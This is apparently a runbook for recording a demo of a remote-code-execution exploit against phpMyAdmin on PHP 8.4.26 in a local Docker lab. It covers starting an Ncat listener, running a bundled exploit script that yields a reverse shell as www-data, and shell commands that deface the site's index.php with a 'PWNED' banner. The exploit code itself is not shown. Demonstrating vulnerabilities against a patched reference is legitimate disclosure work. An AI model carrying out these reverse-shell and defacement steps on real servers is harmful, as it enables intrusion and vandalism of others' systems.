# phpMyAdmin 5.2.2 / PHP 8.4.26 video run

Use two PowerShell windows in this extracted directory. Docker Desktop and
Ncat must already be installed. Everything stays on the local loopback Docker
lab.

## 1. Start the lab and show the normal sites

In the left terminal:

```powershell
.\START-LAB.cmd
```

Wait for both targets to report ready. Open these pages in Chrome:

- vulnerable PHP 8.4.26: `http://127.0.0.1:18212/`
- fixed PHP 8.4.27: `http://127.0.0.1:18213/`

Show that both display the normal phpMyAdmin login page before exploitation.

## 2. Start the listener

In the left terminal:

```powershell
.\LISTEN.cmd
```

Leave it listening on port 4461.

## 3. Run the exploit

In the right terminal:

```powershell
.\EXPLOIT.cmd
```

The runner keeps 148 unfinished requests alive, stages one upload-progress
session, derives the ZendMM and libphp addresses over HTTP, and fires the short
callback command through the remaining lane.

Wait for the genuine target prompt in the left terminal. It will resemble:

```text
www-data@<container-id>:/var/www/html$
```

Type these commands yourself, one at a time:

```sh
whoami
id
hostname
pwd
```

Expected identity:

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html
```

## 4. Change the vulnerable homepage through the shell

Type each command separately:

```sh
cd /var/www/html
cp index.php index.php.bak
echo '<body bgcolor=black text=lime><center><h2><pre>' > index.php
echo ' _   _    _    ____  ____  _____ ____' >> index.php
echo '| \ | |  / \  |  _ \/ ___|| ____/ ___|' >> index.php
echo '|  \| | / _ \ | | | \___ \|  _|| |' >> index.php
echo '| |\  |/ ___ \| |_| |___) | |__| |___' >> index.php
echo '|_| \_/_/   \_\____/|____/|_____\____|' >> index.php
echo '</pre></h2><h1>PWNED</h1><pre>' >> index.php
id >> index.php
echo '</pre></center>' >> index.php
cat index.php
```

Leave the shell open. Refresh `http://127.0.0.1:18212/`; it should show the
green `NADSEC` banner, `PWNED`, and the real `www-data` identity. Refresh
`http://127.0.0.1:18213/`; it should remain the normal login page.

The fixed page is a visual patched reference in this recording. The bundled
saved evidence contains the separately executed PHP 8.4.27 leak/dispatch denial.

Stop recording while the target shell is still open. Do not type `exit` in the
recording.

## 5. Clean up after recording

Press Ctrl+C in the listener terminal (and press `Y` if Windows asks to
terminate the batch job), then run:

```powershell
.\STOP-LAB.cmd
```

The next `START-LAB.cmd` recreates both app containers and restores both normal
phpMyAdmin login pages.
